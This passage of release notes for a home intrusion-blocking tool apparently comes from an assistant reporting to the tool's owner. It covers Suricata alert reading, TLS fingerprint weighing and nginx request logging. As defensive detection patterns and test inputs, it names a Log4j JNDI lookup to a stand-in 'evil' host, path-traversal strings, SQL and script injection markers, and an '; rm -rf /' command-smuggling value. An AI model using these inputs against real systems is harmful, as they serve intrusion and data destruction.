    one address asked about        0 trips

So the split I put in yesterday is gone - lists and the asking box both read
the rule freely, because reading it is now one indexed row rather than a grep
on another machine. The reference on a rule survives the round trip through
the database; checked, because that is exactly the kind of thing that gets
lost when data changes shape.

`test/taps.py` fetches thirty rules and refuses a release where it takes more
than one trip, where asking again takes any, where drawing the list takes any,
or where the rows stop saying what their rules look for.

4.44.6 — **the page was slow because of the links, and you could not see the
links.** Exactly the right instinct, and the mechanism is worse than you
guessed: nothing was fetched from the internet at all. Every row was reaching
across SSH to the proxy to grep the rules file.

Reading what a rule says is a `grep` over SSH - a tenth of a second, thereabouts
- and I put it in `_ids_about()`, which the blocked list and the history call
**for every row**. A hundred rows is a hundred round trips, twice a second, on
a road with nothing on screen to explain the wait. With a realistic 50 ms trip:

    blocked_list(), 100 rows      before  ~5,000 ms      after  2 ms
    one address asked about                              52 ms, one trip

The lists say what they already have - the rule number, the confidence, what
Suricata called it. Reading the rule itself happens only where somebody asked
about **one** address: the asking box and the router sheet, which is exactly
where the answer is worth a tenth of a second.

`test/taps.py` blocks thirty addresses with thirty different rule numbers,
draws the list, and refuses a release where that goes over SSH even once -
then asks about one address and refuses it if that does not.

4.44.5 — the links were pointing at the wrong thing entirely, and your
screenshot shows it three times over.

    "ET DROP Spamhaus DROP Listed Traffic Inbound group 16"
    www.spamhaus.org/drop/drop.txt

That is the **feed the rule was built from** - a file of a hundred thousand
addresses. It says nothing whatever about the one that just fired, and the row
above it already says *"and on the firehol1 list"* in the house's own words.
Same for `www.cinsscore.com`, which is a front page, and
`feeds.dshield.org/block.txt`, which is another list. Three links, none of
them about the incident.

A reference is kept now only where it could be about *this*: a reference to a
list file - `.txt`, `.netset`, `.ipset`, `.list`, `.csv` - or to a bare
hostname with no path is dropped. What survives is the kind worth following:

    ET DROP Spamhaus group 16        no links
    ET CINS Poor Reputation 72       no links
    ET DROP Dshield group 1          no links
    ET EXPLOIT log4j                 CVE-2021-44228, lunasec.io/docs/blog/...

The rule's own words stay in all four cases - *"ET DROP Spamhaus DROP Listed
Traffic Inbound group 16" - misc attack* is still worth reading. It is only
the link that was a waste of a click.

`test/taps.py` puts the three reputation rules from your own log through it
and refuses a release where any of their list links comes back.

4.44.4 — one line in your startup log, and it is the one that matters:

    Warning: ja3: JA3 is disabled, skipping fields

**Asking for the fingerprints in eve-log is not enough.** They have to be
calculated, under `app-layer.protocols.tls`, and left on `auto` they stay off
unless a rule happens to want them. So the `tls` lines would have come out
with no fingerprint in them, the weighing would have counted nothing, and
nothing anywhere would have said why - it is said once at startup and then
never again. My config asked for `ja3`, `ja3s` and `ja4` by name and never
turned any of them on.

    ja3-fingerprints: yes
    ja4-fingerprints: yes

`test/nginx.py` refuses a release where the config asks eve-log for a
fingerprint it never turns on - which is the shape of the fault, not just this
instance of it.

The rest of that log is the first real report from it: **46,587 seconds up,
364,164 packets, 0 drops, 42 alerts.** No drops on four threads means it is
comfortably ahead of the traffic, and the rule reload at 20:15 went through
without a restart, which is the cron line working.

4.44.3 — twenty-eight thousand lines read against the things that actually go
wrong here, and **one memory a stranger could fill**.

The counter of what an address has been doing has had a ceiling since the
beginning: five hundred, oldest dropped. But what is remembered *about* those
addresses - where each was seen, when each was last kept out - had none of its
own, and nothing ever cleared it. Somebody walking a /16 with one knock apiece:

    20,000 addresses, one knock each
    the counter            500      as designed
    where each was seen  20,000     for ever, and never read again

It goes with the counter now, in the same sweep. A counter still standing
still knows where it was seen - checked, because dropping too much would make
the globe and the house marks wrong rather than missing. The same for what was
said about which TLS fingerprint, which is keyed by something a stranger
chooses just as much.

What else the sweep turned up and what it came to: twenty-seven places where
an error is caught and nothing said, all of them deliberate and around things
that may fail (a plug that is off, a file that is not there); one `time.sleep`
near a lock, which is outside it and is there on purpose so other threads get
a turn; one proxy command built from a path, which is the setting-checked one.
No SQL built from anything a caller reaches, no mutable defaults, no `== None`.

`test/taps.py` walks six thousand addresses past it and refuses a release
where any of the three memories grows past the counter's own ceiling.

4.44.2 — **the meta table grew for ever**, and the reason I could not verify
the fix yesterday was my own test rig.

What is kept *about* an address - which list knew it, what Suricata said - is
two rows apiece, and it is written **for every alert, not only for a block**.
Nothing ever took them away. Three hundred addresses is six hundred rows; a
week of a busy proxy is thousands, and every one of them is held in memory as
well as on disk.

They go in the nightly fold, when the address is neither on the list nor
anywhere in the history - which is exactly the moment nothing can ask about it
again:

    50 kept out                204 rows
    the fold, still out        204   kept
    let back in, folded        204   kept, the history still names them
    history gone, folded         4   forgotten

**And yesterday's mystery was mine.** I said the fix worked in one case and
not the other and that I could not explain it, so I took it back out. The
explanation is that my rig reset a meta key called `folded_to` and the fold's
own guard is `aggregated_to` - so the second call returned at the first line
and never ran the body at all. The code was right; the thing I was testing it
with was not. That is the third time this week a wrong rig has sent me
rewriting something that worked, and the tell is always the same: it "worked
once and then stopped".

`test/tables.py` walks an address through all three stages and refuses a
release where anything goes early, or where the fold takes a meta row that is
not about an address at all.

4.44.1 — what Suricata said now reaches the three places somebody actually
reads an address. It was on the router sheet alone, which is the one nobody
opens unless they are already thinking about the router.

**The blocked row, the history, and the box you ask with** all say it now, out
of one function rather than three half-copies:

    📡 rule 2034647.2 · high confidence · major · at the server · over http
    "ET EXPLOIT Apache log4j RCE Attempt" — attempted admin
    it looks for: "${jndi:ldap://", "}"
    mqtt.falco81.net/x — answered 404   as curl/8
    CVE-2021-44228

The asking box is the one that was worst: somebody types an address *because*
they want to know why it was kept out, and it was the only view with nothing
to say about the rule that did it.

`test/render.js` puts one Suricata block through all three and refuses a
release where any of them fails to name the rule, or fails to link what the
rule is about.

4.44.0 — the third one, done: **the TLS fingerprints are read and weighed.**

A JA3 or JA4 fingerprint is the shape of a client's hello - which ciphers it
offers, in which order - and it is the same for every copy of the same tool.
So a hundred addresses with one fingerprint between them is **one tool on a
hundred machines**, and that is the one thing a counter watching addresses one
at a time can never see, however long it watches.

    nine addresses, one fingerprint     nothing
    the tenth                           all ten weighed, three apiece
    ten tools, one address each         nothing
    twenty of the house's own           nothing

**Three apiece, and said once an hour.** A phone app, a browser and a Go
program each have a fingerprint too, and a popular one is shared by thousands
of people who have done nothing - so this is a thing to notice, never a thing
to be sure of, and three of them does not reach fifteen on its own. Only the
last hour counts, or a fingerprint gathers addresses for ever and eventually
everything crosses the bar.

`deploy/suricata.yaml` has `tls` switched on now, with `ja3`, `ja3s` and `ja4`
asked for by name, and the note says to turn it on together with the setting at
the house - on its own it only fills a file.

`test/taps.py` walks the bar from nine to ten, checks the weight, checks it is
not said twice inside the hour, and refuses a release where ten different
tools are read as one or where the house is weighed for its own phones sharing
a fingerprint.

4.43.0 — the three I said I had not done. Two are done; the third is half, and
I will say which half.

**1. The rules file is read.** This is the one that mattered: the sheet said
"rule 2034647" and left you to go and find out what that meant. Now it asks
the proxy for that one line - grepped, not read, out of six megabytes and
forty thousand rules - and says what the rule is:

    📡 rule 2034647.2
       "ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228)" — attempted admin
       it looks for: "${jndi:ldap://", "}"
       CVE-2021-44228

**"It looks for" is the answer to "why me"**: those are the strings out of the
rule itself, so the row says what was in what arrived rather than only that
something was. References on the rule become links where their address is a
rule and not a guess - a CVE number, or a URL the rule's authors wrote down.
The answer is kept, because a rule does not change between fetches, and
neither a rule number nor a path that is not a path is ever handed to a shell:
both are checked, and `test/taps.py` tries `; rm -rf /` as each.

**2. The packets, as an option rather than my opinion.** I talked you out of
these and should have left you the choice, the way the nginx secret is left.
`deploy/suricata.yaml` now carries the line and what it costs - one request
living in three places instead of one, one of them the machine the internet
knocks at - and points at the better answer: **pcap-log, which writes them on
the proxy and copies them nowhere**, with a working block, 500 MB at most and
only the flows that alerted. Evidence belongs next to the thing that made it.

**3. The other eve types: half.** The config now carries `tls` with the JA3/JA4
fingerprints, switched off, where you can see it rather than buried in the
commented block at the bottom - it is the one non-alert type worth its size,
because a scanner's handshake has a fingerprint before it has asked for
anything. But **zigmon still only weighs alerts**, so turning it on would fill
a file nothing reads. Reading and weighing fingerprints is a piece of work of
its own and I have not started it.

4.42.0 — **everything else the eve line carries**, which was being thrown away.

We were reading five fields of a line that has twenty. Now kept, and shown on
the router sheet:

    📡 rule 2034647.2
    📡 high confidence · major · at the server · over http
       mqtt.falco81.net/x?a=...  — answered 404   as curl/8
       CVE-2021-44228

The rule that fired and its revision; what the rule says about itself -
confidence, how serious its authors think it is, what it is aimed at, where it
is meant to be deployed; the protocol; and, where the thing was HTTP, the
host, the path, the status and the user agent.

**None of that is a payload.** Every field above is what Suricata *recognised*,
not what the caller sent - which is why it can be kept here when the packet
cannot. That line stays where it was: `payload: no`, `packet: no`.

**A CVE becomes a link**, to NVD, which is the one address in this business I
would stake something on. Anything in that field that is not a CVE gets no
link at all rather than a made-up one - tried with `../../etc/passwd` in it.

**The rule number is shown and not linked**, deliberately. Every per-rule page
I know of either wants the ruleset version in its address or has moved at
least once, and I could not reach any of them from here to check. A number you
can paste into a search beats a link that quietly rots, and the tooltip says
so.

On the raw packets you asked about: they can stay on the proxy, where
Suricata's own pcap-log writes them if you turn it on, and they should not
come here. The evidence belongs next to the thing that made it; a copy in a
database at the house is one more place for somebody's request to live.

`test/taps.py` checks seven of the new fields come through, that a real CVE
becomes the right link, and that something that is not one becomes nothing.

4.41.3 — a pass over the newest code for faults, and one thing worth fixing in
the timing.

**Nothing throws.** `suricata_weigh`, `full_weigh` and `weigh_press` were given
ten kinds of rubbish each - an empty string, a bare brace, a null alert, a
severity of "two", a four-hundred-character address, a nine-thousand-character
signature, a header name three hundred long and a hundred-kilobyte body - and
none of them faults. What a giant signature leaves behind is sixty characters,
which is the cap doing its job.

**And the blocked card was asking the same question a hundred times.** It asks
which lists know each address, for every row, twice a second - 4,243 queries
for twenty drawings. That only changes when a list is fetched, so it is
remembered for the drawing and dropped the moment one is:

    105 rows, three lists in     8.5 ms  ->  5.4 ms

Everything else, on the real database with 44,409 list ranges, 199,000
countries and 105 blocked addresses:

    2,000 Suricata alerts       197 ms      0.098 ms a line
    status()                    8.9 ms
    anomaly_state()             6.8 ms
    the longest anything else waited for the database while weighing:  0 ms

`test/taps.py` checks the remembered answer is the right one, that asking
twice gives the same, and that fetching a list drops what was remembered about
the old one - which is the half that would have gone wrong quietly.

4.41.2 — two things missing from the package, both of which you found by
running it.

**The config was never in it.** I wrote `deploy/suricata-on-the-proxy.md` and
handed you the yaml as a loose file, and the note said "see the config
beside this file" about a file that was not there. `deploy/suricata.yaml` now
is - the working one off your own proxy, with ens192, HOME_NET set to that
machine and your LAN, eve.json by its full path, alerts with no payload and no
packet, and the two dozen other eve types off and kept commented at the bottom.

**And the cron line named the wrong path.** On AlmaLinux 9 the tool is
`/sbin/suricata-update`, and `/sbin` is not on root's PATH in a cron job - so
the line I gave would have run every Monday and done nothing, for ever, which
is the worst kind of wrong. It names it in full now, as you worked out:

    15 4 * * 1 root /sbin/suricata-update --quiet && /bin/systemctl reload suricata

`test/nginx.py` refuses a release where the note or the config is missing,
where the note does not name the tool by its full path, or where the packaged
config would write packets or payloads to disk.

So: yes, the note in the package is current and the config is beside it. The
one thing neither can carry is `/etc/sysconfig/suricata`, where the unit takes
`-i eth0` from - that one stays yours to edit, and the note says so.

4.41.1 — the dish reaches the story table too. I added the mark to the blocked
rows and the counters yesterday and left the table underneath them without it,
which is the same half-a-card mistake as 4.35.1.

Six slots on every story row now - what happened, the word, where it was seen,
the bell, the dish, the list:

    ⛔ blocked      🏠 ·  📡 ·      18.221.179.104
    ⛔ blocked      🏠 ·  📡 📕     45.9.1.1
    ✅ let back in  🏠 ·  ·  ·      89.24.1.1

That second row is the case you asked about, and it already sorts the way you
want: an address a list knew **and** Suricata saw goes in *Blacklisted IPs*,
because a row belongs to the first fold that is true of it and a list knowing
an address before it ever arrived is the older and stronger fact. The dish is
still on the row, so nothing is hidden by the choice.

`test/render.js` counts six slots on every story row and refuses a release
where two differ.

4.41.0 — **a mark for what Suricata saw, and a fold of its own.**

    📡  Suricata saw this one at the server in front - in the packets, which
        this machine never sees

It sits in a slot of its own beside the others, so the rows still line up, and
it is on the counters as well as the blocked list. What it says is kept beside
the block at the moment it happens, so a row still names who saw it long after
the counter it came from has been forgotten.

And a third fold, the same shape as the other two - shut to begin with, a box
that filters on the address, the country, the reason and on the word
*suricata* itself, and pages of twenty-five:

    ▸ Blacklisted IPs      1 address(es)
    ▸ Seen by Suricata    30 address(es)
    ▸ Blocked by system    1 address(es)

A row belongs to the first of those that is true of it, so nothing is in two
places: an address a list already knew stays in the first fold even if
Suricata saw it too, because that is the older and stronger fact.

`test/render.js` checks all three folds exist, that a row Suricata saw wears
the dish, and that its fold has a box to filter it with.

4.40.5 — the logrotate file Suricata ships is right as it stands, and the note
now says why rather than leaving somebody to check: `delaycompress` keeps
eve.json.1 plain, which is the copy the house reads with tail for whatever was
written between its last reading and the rotation; `compress` gzips .2 onwards,
which the reading passes over; `kill -HUP` makes Suricata reopen, so the new
file starts at nothing, which is the "smaller than where I was" the reading
watches for. Leave it alone.

**The one thing it does not do for you is the ACL**, and my step 6 had that
half wrong. An ACL on the file alone lasts until the next rotation: the rename
carries it to the copy, and then Suricata creates a brand new eve.json on HUP
with no ACL at all. The reading would work for a day and stop quietly at four
in the morning.

    setfacl -m  u:zigmon:rx /var/log/suricata
    setfacl -d -m u:zigmon:r /var/log/suricata      <- the one that matters
    setfacl -m  u:zigmon:r  /var/log/suricata/eve.json

`-d` puts a default on the directory so everything made in it afterwards is
readable. `getfacl /var/log/suricata/eve.json | grep zigmon` after the first
rotation says whether it held.

4.40.4 — your `wc -l` said 0 and `jq` found an alert, and the two together
are a bug I had in every log reader.

764 bytes, no newline on the end: Suricata had written an alert and the line
was still arriving. Read to there, the mark moves past it, and the rest turns
up *after* the place the reading said it had got to - so that alert is lost
for good, and it is always the newest one, which is the one somebody is
watching for.

An unterminated last line is now left where it is and read whole next time:

    the file so far      {"a":1}  {"b":2}  {"c":3
    first reading        {"a":1}  {"b":2}
    the rest arrives     }  {"d":4}
    second reading       {"c":3}  {"d":4}     once, and whole

This is every log, not just Suricata's - the nginx ones have always been read
the same way, and a line landing exactly as the minute ticks over has been
losing itself quietly since the day the reading was written.

`test/taps.py` writes half a line, reads, finishes it, reads again, and
refuses a release where the half is read broken or twice.

4.40.3 — two things the package does that no amount of suricata.yaml undoes,
both now in the note.

**The unit names the interface on the command line**, from
`/etc/sysconfig/suricata`, and that beats the af-packet block entirely. Edit
`OPTIONS="-i eth0 --user suricata"` there; `systemctl status` shows the line it
really ran.

**And it runs as the suricata user while /var/log/suricata belongs to root** -
made worse by running `suricata -T` as root first, which creates the files
root-owned. Then:

    E: logopenfile: Error opening file: ".../eve.json": Permission denied
    W: runmodes: output module "eve-log": setup failed

and it **carries on running with no output at all**. Active, green, writing
nothing - a worse failure than stopping would be. `chown -R
suricata:suricata /var/log/suricata` and start it again.

4.40.2 — the install note, now matching what your machine printed. Two wrong
lines in two days, both from memory:

**`dnf install -y suricata suricata-update`** - the second word is not a
package. It is a Python tool inside the first one, and dnf abandons the whole
transaction over a single argument it cannot match, so it installed nothing
and said only "Unable to find a match". One wrong word, and the error names
the wrong thing.

**Then "EPEL 9 does not carry Suricata"** - me over-correcting from the first
failure. It does carry it, 7.0.16, and the copr project I sent instead does
not exist.

    dnf install -y epel-release
    dnf install -y suricata

The note now also carries your own machine: `ens192`, HOME_NET set to
192.168.43.17/32 and 2a02:7a00:e:4::17/128 - and the thing that matters about
those two. **Your v4 address is private.** Whatever the internet reaches that
machine through decides what Suricata sees as the source on the v4 side: a
straight port forward and it is the real caller; a proxy that terminates the
connection and it is that proxy, for ever, which the weighing would take for
one very busy attacker. `zigmon --proxy --test` shows the addresses it found -
if they are all the same one, that is what has happened, and the v6 side,
where the address is real, is the half worth weighing.

4.40.0 — **Suricata on the proxy, read as a seventh log.**

It watches the packets that machine receives, which this house never sees: a
scan that never becomes a request, a handshake with something wrong in it, an
exploit it knows by name. It does the recognising; the keeping out is still
done here, by the same weighing and the same ladder as everything else, so
nothing is ever refused for a reason nobody can read afterwards.

Its own severity is the honest signal, so it is what the weight follows:

    1  "this is an attack"      weighs 8   two of them is a block
    2  "this looks like one"    weighs 4
    3  "worth knowing"          weighs 1

*How sure it has to be* is the least sure it may be and still be weighed at
all - 2 by default. And the classes that say plainly nothing is wrong - Not
Suspicious Traffic, Misc activity, Generic Protocol Command Decode, Network
Scan - are never weighed at any setting, because Suricata writes a great many
of those and a house that acted on them would keep out everybody who ever
pinged it.

**An alert about what this house sent is not weighed against anybody.** That
is ours to fix, not somebody's to answer for.

`deploy/suricata-on-the-proxy.md` is the whole thing for AlmaLinux 9: install,
which card to watch, HOME_NET set to that one machine, eve-log cut down to
alerts alone with `payload: no` (the payload is whatever somebody sent, and
this file is read over SSH and kept here), the ET Open rules and a weekly
refresh, the ACL so the house's own user can read it, and what to do if it
eats the machine. Its rotation is the HUP kind, which the reading already
handles.

`test/taps.py` puts seven shapes of eve.json through it - the two that weigh,
the one too unsure to, two harmless classes, a flow line that is not an alert,
and one about the house itself - and refuses a release where any is read
wrong. `test/cli.py` refuses one where `--proxy` does not name it.

4.39.0 — **the Emerging Threats lists**, which is the part of that idea worth
having today.

    Emerging Threats: compromised     588 machines being used by somebody
                                      who is not their owner, rebuilt daily
    Emerging Threats: block         1,646 networks they say nothing good
                                      comes out of

Same people who write the Suricata and Snort rules. Fetched here, counted,
and put through a lookup that stays at five microseconds with them in.

**And they know your callers.** Of the 160 addresses in yesterday's log, 29
are on one of these two - 80.94.95.211, the whole of 213.209.159.x, 65.49.1.x
- every one of which the house had already worked out for itself by watching
what they did. That is the useful reading: they agree with you, and they would
have known first.

On the bigger idea, honestly: **Suricata and Snort rules do not fit this
project, and running Suricata does.** Their rules match packets - byte offsets
into a TCP payload, flow state, flowbits set by an earlier packet - and an
nginx log line has none of that. The subset that would translate (content and
pcre on the URI and the user agent) is maybe a tenth of the ruleset, and
writing a half-parser for their syntax to get it would be a project of its own
with a poor fidelity story.

What fits: run Suricata on the proxy, where it can see the packets it was
written for, and read its `eve.json` as a seventh log - one more path, weighed
by severity like everything else. It does the detection it is good at, this
does the banning it is good at. Say the word and I will do that one properly.

4.38.1 — the logs read, and **the dashboard was refusing itself two thousand
times an afternoon.**

    2,224 x 403 on the house's own web server
      877  192.168.40.10  GET /?api=blocked
      877  192.168.40.10  GET /?api=approvals
      594  in the worst hour, from one browser

Both of those views hold addresses, so the daemon refuses them without the
PIN - correctly. The Public API tab asked for them twice a second anyway,
locked or not, and every one came back 403. Work for the relay, lines in the
log, and nothing on the screen either way. Asked once now, so the card can say
it is locked, and not again until somebody unlocks.

The rest of the reading, and it is a quiet set: one upstream reset at 00:20,
one plug that would not take a binding, one message the gateway would not hand
over, 116 requests the browser gave up on mid-flight (the long-poll, closing a
tab), 39 refusals from php-fpm being briefly busy. Nothing on the proxy that
the weighing does not already know about.

Also fixed a hazard in the walk itself: the new check stubbed `fetch`, and a
real request let out under the stub landed later and repainted over what the
*next* check had set up - which is why the SIM check started failing in a
place nothing had touched. The stub answers the request itself now, and the
name it restores is in scope where the restoring happens.

4.38.0 — **the allowlist asks the links, as they stand.** You are right that
this should not be a list I keep up to date by hand: a link declares the
arguments it takes, you add one on the settings card at four in the afternoon,
and anything written into the program is wrong by teatime.

The fixed part stays fixed - the app's own headers and what a proxy or a
browser adds. The arguments are asked of the links and the scripts they point
at, every time a press is weighed:

    no link declares anything     X-Zigmon-Arg-Room  ->  a header nobody here sends
    a link says it takes "room"   X-Zigmon-Arg-Room  ->  nothing
                                  X-Zigmon-Arg-Hack  ->  a header nobody here sends

That second line is the point, and so is the third: **an argument nobody
declared, sent to a link that does not take one, is exactly the thing worth
noticing** - and before this it was waved through because its name began the
right way. Both directions got better, not just the false-positive one.

`test/taps.py` presses with an argument before anything declares it, declares
it, presses again, and presses with one nobody declared - and refuses a
release where any of the three comes out wrong.

4.37.1 — **the rule I added yesterday kept out your own dashboard and your own
phone.** Two faults, and the first is the one I keep making.

**The allowlist was written from memory instead of from the app.** The relay
sends `X-Zigmon-Via` - it has since 3.x, it is in web/zigmon-api.php, I could
have grepped for it in two seconds - and my list of "headers this app sends"
did not have it. So every press through the dashboard carried a header the
house had never heard of, and 192.168.40.170 went on the list. Your phone
went on for the same kind of reason. The list is now taken from the source:
every `X-Zigmon-*` the app actually sends, plus what a proxy, a browser or an
iPhone legitimately adds.

**And the weight was wrong even where the rule is right.** An unfamiliar
header is a thing to notice, not a thing to be sure about - it is most often
a new phone, a new browser or a proxy nobody thought about. It had its own
kind now, *a header nobody here sends*, weighing one rather than six, and the
three that really do redirect a request keep theirs. Weight one still blocked
on its own, because trying lots of things adds bonuses on top: five presses
carrying one unfamiliar header each came to sixteen of fifteen. So it is said
**once an hour per address**, not once per press. Twenty presses now come to
one of fifteen.

To clear the two that are on the list: *Take them all off*, or `zigmon block
--off 192.168.40.170`. They were never actually refused - both are under
*never kept out* - but the row is there and the router was told.

`test/taps.py` presses with `X-Zigmon-Via`, `X-Real-Ip`, `X-Forwarded-Proto`
and `X-Requested-With` and refuses a release where any of them weighs
anything, presses twenty times with an unfamiliar header and refuses one where
that blocks, and still requires three `X-Original-URL`s to block.

4.37.0 — **your idea, and it is better than what I built.** The front server
logs everything of everything *except* the one road where the secret travels;
that road is weighed by the daemon, where the whole request is in hand and
none of it has to be written down anywhere.

So a press is now weighed as it arrives - every header, the body, the lot -
by the same rules the full log uses, and the reason is kept while the request
is not:

    no secret at all                tap-no-secret       POST /tap carrying no secret
    X-Original-URL: /admin          proxy-header-trick  x-original-url: /admin
    X-Api-Version: 2                proxy-header-trick  x-api-version: 2
    a body with ${jndi: in it       proxy-payload       a JNDI lookup - the Log4j one
    multipart/form-data             tap-odd-body        content-type multipart/form-data
    a four-megabyte body            tap-odd-body        a body of 4194304 bytes
    an ordinary press               nothing
    X-Zigmon-Arg-Room: kitchen      nothing             - that one is ours

**The header rule is the one only the daemon can have**: any `x-` header that
is not one of the ten this app or a proxy legitimately sends is somebody's
idea, and it is weighed. nginx could never do that for this road without
writing the secret beside it.

Found while wiring it: `full_weigh` matched the road as `/tap` only, and the
daemon is handed it as `/api/tap` - so two of the six rules were silent on
exactly the requests this change exists for. Both names now.

`test/taps.py` puts eight presses through it and refuses a release where any
is read wrong, or where the secret appears anywhere in what the weighing
keeps.

4.36.2 — checked the package against what each file is supposed to carry, and
found one gap.

Every nginx file in it is current: the tap front has the full log in all three
server blocks and the note about the secret, ntfy-server.yml has its log-file,
the logrotate takes both full logs. `nginx-zigmon.conf` is the home one and
nothing since 3.x has touched it - which is right, not stale.

**The gap**: the ntfy front wrote its full line only inside `location /`, so a
request turned away by the host check - asked for by the bare address rather
than the name - never reached it and went unwritten. Those are exactly the
ones worth having. Both levels now: the server block catches what is refused
before it goes anywhere, the location catches the rest with its TLS fields
filled in, and nothing is written twice because a location's own access_log
replaces the server's for requests that get that far.

`test/nginx.py` refuses a release where that file names its full log in fewer
than two places.

4.36.1 — a fair question, answered in the file rather than in a message: what
it would take to log the secrets themselves, and what it costs.

`nginx-tap-front.conf` now carries the one line to change and the three
things that change with it - push fatigue at three in the morning being the
one that actually works on people who know better; links with no second
factor, which act on the secret alone and are the ones nobody thinks about;
and one value becoming three, since the file lives on the machine the
internet knocks at and a copy is kept at home. And what it buys: nothing the
weighing uses, because every rule asks whether a secret was there, not which.

**On whether the log is worth anything as it stands**: for the tap road alone,
barely. Of the twenty-seven fields, fourteen are empty on every one of your
four lines - a press from Shortcuts carries no referer, no cookie, no origin,
no body. What it does carry is the timing, and that is the interesting part:
3.1 s, 3.4 s, 3.1 s, 6.9 s. That is Duo waiting for your thumb, and a press
that answered in 200 ms would mean something had got past it.

The full log earns its keep on **everything else**, which is why 4.35.0 moved
it to the server block. Your file has four lines because your nginx is still
on the 4.33 config, where it was written only inside `location = /tap`. The
scanners never go there. Take the 4.35.0 file, `nginx -t && systemctl reload
nginx`, and the same day will fill it with three thousand lines of the traffic
that is actually worth reading.

4.36.0 — a fresh day read, and **a path climbing out of where it is now reads
as what it is.**

    GET /../zigmon.py HTTP/1.1     400

That was in your log twice, and it was being counted as an ordinary path that
is not there - weight two, the same as `/phpinfo.php`. It is not the same:
nobody asks for that by accident, and it names the file the whole house runs
on. It weighs eight now, as the full log already weighed the same thing in a
body, in the shapes people write to get past something looking for the plain
one: `../`, `..\`, `%2e%2e`, `%252e`, `..%2f`, `.%2e/`, and a null byte.

**The ordinary log matters most for this**, because it is where nearly every
request is ever seen - only the tap road and the ntfy name write a full line,
and the walkers touch neither.

The day, 3,497 requests from 159 addresses, as it now reads:

    1,006  a path that is not there        196  asked by address, not by name
      151  knocking at the door             24  bytes that are not a request
        8  a path climbing out               8  an odd method
        6  an open-proxy try                 4  a refusal the house made
        1  past the limit                    1  a guessed link secret

25 kept out. One address asked for **272 different paths**, another 237 - both
well past the thirty-an-hour that makes a sweep, both on the list.

`test/taps.py` puts five paths through the ordinary weigher and refuses a
release where a climbing one reads as anything else, or where `.env` and
`favicon.ico` stop reading as what they are.

4.35.1 — the story table's marks line up too. The blocked rows got their fixed
slots in 4.23.2 and the table underneath them was left packing three to five
marks into one line, so the word and everything after it landed somewhere
different on every row - the wobble your red line traced.

Five slots on every row, filled or not: what happened, the word, where it was
seen, the bell, the list.

    ✅ let back in  🏠 ·  ·
    ⛔ blocked      🌐 ·  ·
    ⛔ blocked      🌐 🔔 ·
    ⛔ blocked      🏠 ·  📕
    ⛔ blocked      🏠 ·  ·

`test/render.js` counts them on every row and refuses a release where two rows
differ, or where any row carries other than five - the same rule the blocked
list already had, which is why only half the card was straight.

4.35.0 — **the full line for every request, not only the one road.**

The scanners never touch /tap. They ask for `.env`, they walk methods, they
try to be an open proxy - and all of that was landing in the ordinary log,
which has a path and a status and nothing else. Now every server block on that
name writes the full JSON line: the real one, and both default blocks, which
is where everything that asks for the machine by its bare address lands.

One honest limit, said in the file itself: **a refused request carries no
body**. nginx does not read a body it is not going to pass anywhere, so
`"body"` is filled in for the tap road and empty for everything refused. The
headers, the method, the path, the times, the sizes, the TLS version and the
user agent are all there either way.

**And the ntfy one moved into its location**, which fixes the `"ssl":"/"` you
spotted: at server level the line is written before nginx has the TLS fields
to hand, so every row said nothing there. In the location they are filled in.

The logrotate file now takes both full logs as well - daily, fourteen kept,
rolled at 50 MB, `create 0640 root adm`, and `kill -USR1` rather than
copytruncate because nginx reopens its own logs when it is told to. They are
the biggest files of the lot and the ones most worth keeping to root.

`test/nginx.py` refuses a release where the full log is written in fewer than
three blocks, where it is not escaped as JSON, or where either format writes
down the link secret or the ntfy token itself.

4.34.1 — **`zigmon --proxy` never learned about the two full logs**, so a
house that had switched them on saw six paths listed and no sign of the other
two. That is not the reading being broken; it is the one place you would look
to find out being silent about it.

    the log       /var/log/nginx/zigmon-tap.log
    its errors    /var/log/nginx/zigmon-tap-error.log
    the full log  /var/log/nginx/zigmon-tap-full.log
    ntfy in full  /var/log/nginx/ntfy-full.log

And the case that would have wasted an evening: the switch on with no path
set says so in as many words - *named, but "Read the full log as well" is off*
the other way round, and *the full log is switched on but no path is set for
it* in the log when a sweep finds nothing to read.

`test/cli.py` refuses a release where `--proxy` does not name every log it can
be set to read. That is the rule that was missing: four logs were added over
three releases and the command that reports them was updated twice.

4.34.0 — **the notification server gets the same full line**, weighed by its
own rules, and both formats carry a good deal more of the request.

`log_format ntfyfull` in deploy/nginx-ntfy-front.conf, under a name of its own
because nginx declares a format once for the whole of itself and two files
cannot both call it tapfull. Same fields, same escape=json, and the
Authorization value is not written down - only whether there was one, since
that is the token the phone holds and this file is copied here too.

**Its rules are not the tap road's**, because the shapes are not comparable:
somebody publishing a message legitimately sends any body at all, of any size,
so a big body or an odd content-type means nothing there. What does count:

    arriving with no name and being refused for it     ntfy-guess
    past the rate limit                                proxy-flood
    a header that tries to send the request elsewhere  proxy-header-trick
    a body trying to be code                           proxy-payload

Six shapes through it, including a four-hundred-kilobyte message that is
perfectly fine and weighs nothing.

**And both formats carry more**: Accept, Accept-Encoding, Accept-Language,
Connection, Upgrade, Via, X-Real-IP, X-Forwarded-Port, Client-IP, Forwarded,
DNT, Content-Length, the scheme, the whole request length, and which TLS
version and cipher was used. nginx only gives what is named - there is no
"every header" variable without lua - so the list is the ones worth naming,
and it is one line to add another.

4.33.0 — **the whole request, and what can be judged from it.**

nginx writes one line of JSON per request at the one-tap road - `log_format
tapfull` in deploy/nginx-tap-front.conf - carrying the body, every header
worth naming, the times and the sizes. JSON with `escape=json`, because a
scanner puts newlines and quotes in a body on purpose: without it a crafted
body writes a second line of its own and says whatever it likes about
whoever it likes. Tried, and it stays one line.

**Two things are not written down**: the link's own secret and the
second-factor code. The log says `"secret":"sent"` or `"none"` and nothing
more. That file sits on the machine the internet is knocking at - the one
that gets `.env`, `/.git/config` and open-proxy tries every day - and it is
copied here and kept in a database as well, so a value in it would exist in
two more places than it does now. Every rule below asks only whether it was
there.

What it catches that an ordinary log cannot:

    a POST to /tap carrying no secret at all      weighs 6
    a content-type that road never takes          weighs 4
    a body of four megabytes                      weighs 4
    X-Forwarded-Host, X-Original-URL,
      X-Rewrite-URL - headers whose whole purpose
      is to send a request somewhere else         weighs 6
    a body trying to be code - ${jndi:, <script,
      ../../, union select, /etc/passwd, <?php    weighs 8

**And the reason says which.** Not "a bad request" but *X-Original-URL:
/admin*, or *a JNDI lookup in the body: ${jndi:ldap://evil/x}* - so the block
can be judged rather than taken on faith. A press that works weighs nothing.

Off until you switch it on and name the file, under *The server that faces
the internet* -> *the full log, body and headers*. Rotate it and keep it to
root: a body is whatever somebody felt like sending.

`test/taps.py` puts nine shapes through it - including a body crafted to look
